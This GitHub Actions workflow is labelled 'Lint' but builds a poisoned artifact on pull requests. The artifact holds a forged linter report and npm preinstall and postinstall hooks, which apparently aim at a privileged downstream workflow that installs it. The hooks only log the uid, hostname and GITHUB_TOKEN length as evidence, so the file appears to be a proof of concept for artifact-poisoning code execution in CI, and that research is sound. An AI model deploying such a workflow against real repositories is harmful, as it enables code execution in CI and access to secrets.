name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Compose attacker artifact
        run: |
          mkdir -p out/evil
          printf 'FORGED linter report (attacker supplied)\n' > out/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          cat > out/package.json <<'PKG'
          {
            "name": "gab-verify-root",
            "version": "1.0.0",
            "private": true,
            "scripts": { "preinstall": "node preinstall.js" },
            "dependencies": { "gab-verify-evil": "file:./evil" }
          }
          PKG
          cat > out/preinstall.js <<'JS'
          const fs=require('fs'),os=require('os');
          const line='PREINSTALL_RCE uid='+(process.getuid?process.getuid():'n/a')+' host='+os.hostname()+' token_len='+(process.env.GITHUB_TOKEN||'').length+' event='+process.env.GITHUB_EVENT_NAME+' run='+process.env.GITHUB_RUN_ID;
          fs.appendFileSync('evidence.txt', line+'\n');
          console.log(line);
          JS
          cat > out/evil/package.json <<'PKG'
          {"name":"gab-verify-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          PKG
          cat > out/evil/hook.js <<'JS'
          const fs=require('fs'),os=require('os');
          const line='POSTINSTALL_RCE uid='+(process.getuid?process.getuid():'n/a')+' token_len='+(process.env.GITHUB_TOKEN||'').length+' event='+process.env.GITHUB_EVENT_NAME;
          fs.appendFileSync('evidence.txt', line+'\n');
          console.log(line);
          JS
          printf 'foreground-scripts=true\n' > out/.npmrc
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: ignore
